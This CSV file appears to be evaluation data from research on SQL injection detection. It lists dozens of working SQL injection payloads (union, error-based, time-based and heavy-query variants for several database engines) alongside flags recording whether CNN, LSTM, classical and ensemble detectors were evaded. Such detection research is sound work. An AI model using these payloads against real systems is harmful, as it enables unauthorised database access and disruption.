,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
4026,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--","-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1,1,0,0,0,0,0
4027,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --","1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1,1,0,0,0,0,0
4028,"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0,0,0,0,0
4029,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0,0,0,0,0
4030,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #","1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,0,0,0,0,0
4031,"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --","1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --",1,1,0,0,0,0,0
4032,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --","-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",0,1,0,0,0,0,0
4033,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --","1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,1,0,0,0,0,0
4034,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,1,0,0,0,0,0
4035,"1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--","1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
4036,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue","1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",1,1,0,0,0,0,0
4037,"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --","1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,1,0,0,0,0,0
4038,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1,1,0,0,0,0,0
4039,1  )   as ilqx where 8547  =  8547,1  )   as ilqx where 8547  =  8547,0,1,0,0,0,0,0
4040,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #","1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,0,0,0,0,0
4041,"1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0,0,0,0,0
4042,"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,0,0,0,0,0
4043,"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld","1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",1,1,0,0,0,0,0
4044,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,1,1,0,0,0,0,0
4045,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl","select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",1,1,0,0,0,0,0
4046,select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,0,1,0,0,0,0,0
4047,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1,1,0,0,0,0,0
4048,"-1475""  )   union all select 8611,8611,8611#","-1475""  )   union all select 8611,8611,8611#",1,1,0,0,0,0,0
4049,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--","1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",1,1,0,0,0,0,0
4050,"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0,0,0,0,0
4051,select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,1,1,0,0,0,0,0
4052,1'||  (  select 'sbft' where 8748  =  8748,1'||  (  select 'sbft' where 8748  =  8748,1,1,0,0,0,0,0
4053,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --","1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",1,1,0,0,0,0,0
4054,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#","-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1,1,0,0,0,0,0
4055,"1"" where 8089  =  8089","1"" where 8089  =  8089",1,1,0,0,0,0,0
4056,-2936  )   or 6872  =  6872,-2936  )   or 6872  =  6872,0,1,0,0,0,0,0
4057,"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0,0,0,0,0
4058,"1%'   )    )     )   union all select null,null,null,null,null,null,null#","1%'   )    )     )   union all select null,null,null,null,null,null,null#",1,1,0,0,0,0,0
4059,"1'||  (  select 'xjtq' from dual where 5719  =  5719 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'","1'||  (  select 'xjtq' from dual where 5719  =  5719 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1,1,0,0,0,0,0
4060,"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  ""","1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,1,1,0,0,0,0,0
4061,"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  ""","1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,1,1,0,0,0,0,0
4062,1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq,1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq,1,1,0,0,0,0,0
4063,"1""  )   where 9827  =  9827","1""  )   where 9827  =  9827",1,1,0,0,0,0,0
4064,"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#","1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",1,1,0,0,0,0,0
4065,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #","1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,1,0,0,0,0,0
4066,"1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --","1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",0,1,0,0,0,0,0
4067,1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,0,0,0,0,0
4068,"1'  )   union all select null,null,null,null,null,null,null--","1'  )   union all select null,null,null,null,null,null,null--",1,1,0,0,0,0,0
4069,"1%"" waitfor delay '0:0:5' and ""%""  =  ""","1%"" waitfor delay '0:0:5' and ""%""  =  """,1,1,0,0,0,0,0
4070,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1,1,0,0,0,0,0
4071,"-5278""   )    )     )   union all select 5264,5264,5264#","-5278""   )    )     )   union all select 5264,5264,5264#",1,1,0,0,0,0,0
4072,-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,1,1,0,0,0,0,0
4073,1'||  (  select 'boib' where 9595  =  9595,1'||  (  select 'boib' where 9595  =  9595,1,1,0,0,0,0,0
4074,"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --","1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,0,0,0,0,0
4075,"-4934"" union all select 5119,5119,5119,5119,5119--","-4934"" union all select 5119,5119,5119,5119,5119--",1,1,0,0,0,0,0
4076,"1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '","1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",1,1,0,0,0,0,0
4077,"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0,0,0,0,0
4078,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--","1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",1,1,0,0,0,0,0
4079,"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  ""","1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,1,0,0,0,0,0
4080,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'","1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",1,1,0,0,0,0,0
4081,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,0,0,0,0,0
4082,"iif  (  4638  =  8258,1,1/0  )  ","iif  (  4638  =  8258,1,1/0  )  ",0,1,0,0,0,0,0
4083,"-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,0,0,0,0,0
4084,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0,0,0,0,0
4085,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,1,1,0,0,0,0,0
4086,"1'   )    )     )   union all select null,null,null,null--","1'   )    )     )   union all select null,null,null,null--",1,1,0,0,0,0,0
4087,"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --","1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",1,1,0,0,0,0,0
4088,"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""onhh""  =  ""onhh","1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""onhh""  =  ""onhh",1,1,0,0,0,0,0
4089,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'blie'  =  'blie","1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'blie'  =  'blie",1,1,0,0,0,0,0
4090,"1"" where 7245  =  7245 and 9198  =  9198--","1"" where 7245  =  7245 and 9198  =  9198--",1,1,0,0,0,0,0
4091,"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'yqmv'  =  'yqmv","1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'yqmv'  =  'yqmv",1,1,0,0,0,0,0
4092,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ","1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,0,0,0,0,0
